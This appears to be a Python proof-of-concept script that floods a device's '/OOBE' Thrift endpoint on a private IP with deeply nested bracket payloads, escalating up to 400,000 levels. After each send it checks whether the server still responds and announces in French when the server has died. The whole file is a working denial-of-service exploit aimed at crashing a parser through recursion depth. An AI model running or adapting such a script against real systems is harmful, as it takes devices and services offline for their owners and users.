import json, urllib.request, socket, time
DEV="10.201.126.241"
def alive():
    try:
        s=socket.create_connection((DEV,8080),timeout=3); s.close(); return True
    except: return False
def post(body, tmo=8):
    try:
        r=urllib.request.Request(f"http://{DEV}:8080/OOBE", data=body,
            headers={"Content-Type":"application/x-thrift"})
        return urllib.request.urlopen(r,timeout=tmo).status
    except Exception as e:
        return f"ERR {type(e).__name__}"
print("baseline alive:", alive())
for depth in [100, 1000, 5000, 20000, 100000, 400000]:
    body = b"[" * depth + b"]" * depth
    t0=time.time()
    st = post(body)
    ok = alive()
    print(f"depth={depth:7} len={len(body):8} -> {st!s:22} alive_apres={ok}  ({time.time()-t0:.1f}s)")
    if not ok:
        print(f"  ★★★ SERVEUR MORT apres depth={depth}")
        break
    time.sleep(1)
